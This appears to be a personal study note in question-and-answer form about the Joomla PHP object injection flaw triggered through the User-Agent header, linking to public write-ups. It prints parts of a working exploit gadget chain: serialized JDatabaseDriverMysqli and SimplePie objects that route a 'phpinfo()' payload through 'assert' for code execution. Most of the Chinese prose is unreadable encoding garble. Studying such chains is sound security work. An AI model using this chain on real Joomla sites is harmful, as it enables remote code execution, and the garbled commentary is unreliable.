#Weekend From Cao
@(WebPEN)[Joomla, infosec, PHP Object Injection]

>����ĵ�
>http://drops.wooyun.org/papers/11330
>http://drops.wooyun.org/papers/11371
>http://xteam.baidu.com/?p=379&utm_source=tuicool&utm_medium=referral


1. User-Agent�����JDatabaserDriverMysqliӦ�û��б�����ݣ����ڹ���User-Agent��ʱ��ֻд��exp���л�����ַ�������Դ���ҳ��Ӱ�죿
 ![Alt text](./1450510616200.png)

>Re:
>�Ҿ���Ϊ�˱������`123}__test`�ĳ� `Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0` Ҳ����ν�������ҵ����һ��User-Agent��������ʶ��ͻ��˵ģ������㲻ͬ���������һЩ�����Ϣ���ܻ����һЩ�﷨�����ϵ�Bug(?)��UA���и����þ���ʶ���Ƶ�����ǲ��Ƕ���İɣ�����˵���ͬһ��IP��ͬһ��UA��Ƶ���ʵĻ����ܾ�DDoS����������ɨ�˼��ˣ������ͬUA�Ļ����ܻ���Ϊ���Ǹ������r(�s���t)�q

2.	JDatabaseDriverMysqli�౾û��$a��Ա�����������л�������ַ������Ƿ���Դ��ڣ�
```
class JDatabaseDriverMysqli {
    protected $a;
    protected $disconnectHandlers;
    protected $connection;
    function __construct()
    {
        $this->a = new JSimplepieFactory();
        $x = new SimplePie();
        $this->connection = 1;
        $this->disconnectHandlers = [
            [$x, "init"],
        ];
    }
}

$a = new JDatabaseDriverMysqli();
echo serialize($a);
```
![Alt text](./1450510636092.png)
![Alt text](./1450510641396.png)
 
>Re:
>ɶ����ʵ��û̫��������ɶ�������Ҷ�������˼�������ǡ�a����ô���ֵģ����������ð��һ��ǲ������о��Ƕδ����������ͼ��Ķ���û��ϵ���������ͼӦ����˵�����л�����ַ����������Ҳ�����ˡ�

3. �����л���������б���n�����û�У��ǲ���Ҫ����JDatabaseDriverMysqli������������
```
class a{
var $m;
var $n;
}
unserialize(��O:1:��a��:1:{s:1:��m��;}��);
```
>Re:
>�Ҿ���û��ϵ����û�еĻ���˵��û�õ�����

4.	
 ![Alt text](./1450510649034.png)

>Re:
>�����ҵ���⣬���©�������÷ֳ�������
>1. ����һ������Ȩ�޵�session/�ѵ�ǰsession����Ȩ
>2. �������ӵ��Ȩ�޵�sessionִ�д���	

5.	�����л�JDatabaseDriverMysqli���Ƿ��������������ִ��֮ǰ���ı�$disconnectHandlers��ֵ��

>Re:
>�����л�����ô���أ��Ҳ�̫���ף���Ȼ��������ע���ˣ�Ϊʲô��ֱ�Ӹģ�

6.	$javascript�����壿
```
class SimplePie {
    var $sanitize;
    var $cache;
    var $cache_name_function;
    var $javascript;
    var $feed_url;
    function __construct()
    {
        $this->feed_url = "phpinfo();JFactory::getConfig();exit;";
        $this->javascript = 9999;
        $this->cache_name_function = "assert";
        $this->sanitize = new JDatabaseDriverMysql();
        $this->cache = true;
    }
}
```
>Re:
>Ӧ����Ϊ������֮��JS����Ҳ����ִ�а�